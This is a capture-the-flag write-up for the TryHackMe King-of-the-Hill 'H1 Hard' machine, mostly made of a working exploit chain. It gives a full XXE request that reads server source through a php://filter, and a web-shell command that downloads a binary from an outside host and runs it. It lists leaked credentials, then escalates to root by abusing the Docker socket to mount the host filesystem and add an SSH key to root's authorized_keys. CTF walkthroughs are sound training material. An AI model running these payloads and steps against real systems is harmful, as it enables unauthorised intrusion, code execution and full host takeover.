# H1 Hard THM Public Writeup
# TESTING and verification required!

#### Map
```lua
nmap service overview


-- Webservers on 80, 81, 82 and 8888 - deadends
# 80 is a non-api api
#
# posts to api/user/login 
# api/user says no permissions
# api/ reveals the api name and stack

# 81 is a product site.
# 
# Contains a hidden access_log that seems to track all path and user agents that access it. this reveals at the top a /s3cr3t_area, but that just contains a hackerman image


# 82
# 82 appears to have some sort of LFI via its view?image= and feed?dir=, but seems constrained to the /hill directory. dir can view a directory down, revealing the file contents of the website, but view cant see this

# 8888
# 8888 contains a simple api where /users provide some creds: davelarkin:supersecurehuh. these work on ssh port 2222 to give access to a container the container has the docker sock mounted (at /var/docker.sock), but this seems unusable without root access, and I couldn't see how to privesc
```

#### Default Credentials
```
X : Y
```

#### Network Services to Foothold
xxe on `/api/user?xml`

```bash
KOTHIP=10.10.10.10
cp xxe.req.bak xxe.req
sed -i "s/CHANGEIPHEREWITHSED/$KOTHIP/g" xxe.req
```

EDIT TO exploit
```
POST /api/user?xml HTTP/1.1
Host: CHANGEIPHEREWITHSED
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
Content-Type: application/xml; charset=utf-8
Content-Length: 190

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/controllers/Website.php"> ]>
  <data>
    <id>
  &xxe;
    </id>
  </data>
```

 reading website.php reveals the cookie to access internal pages, which can be used to access the shell page and execute commands (here downloading a rush client with curl):

  ```
  curl -d "cmd=wget+10.10.29.36:1234/client+-O+/tmp/client+%26%26+chmod+777+/tmp/client+%26%26+/tmp/client" -H "Cookie: token=1f7f97c3a7aa4a75194768b58ad8a71d" http://10.10.138.24/shell
  ```

#### Privilege Escalation

- on the box, you can su to the admin user via `ssh admin@localhost -t bash` with password `niceWorkHackerm4n`, recovered from the api.php file
- admin's path is constrained, so use `export PATH=/bin:/usr/bin` to fix it
- admin can jump to root via `sudo -i`
- grab a static copy of curl for the box, e.g. via `wget https://github.com/moparisthebest/static-curl/releases/latest/download/curl-amd64`, and get it on the machine
- use this to abuse the local docker.sock to create a container with the host filesystem mounted (put your public key in place):

```bash
curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http://localhost/containers/create -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"c3:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "echo <public key> >> /var/tmp/root/.ssh/authorized_keys"]}'
```
  This will output an id used in the next step.
- start the container: 
```bash
curl -X POST -H "Content-Type:application/json" --unix-socket /var/run/docker.sock http://localhost/containers/<id here>/start
```
  
Then you should be able to straight `ssh root@<boxid>`.

#### Flags
Flags ? `/root/king.txt`
```
/root/root.txt
/root/containter1_flag.txt
/var/www/container2_flag.txt (in 81 docker)
/home/container3_flag.txt
/home/davelarkin/container4_flag.txt (in 8888 docker)
```
#### References

https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/koth-h1-hard.md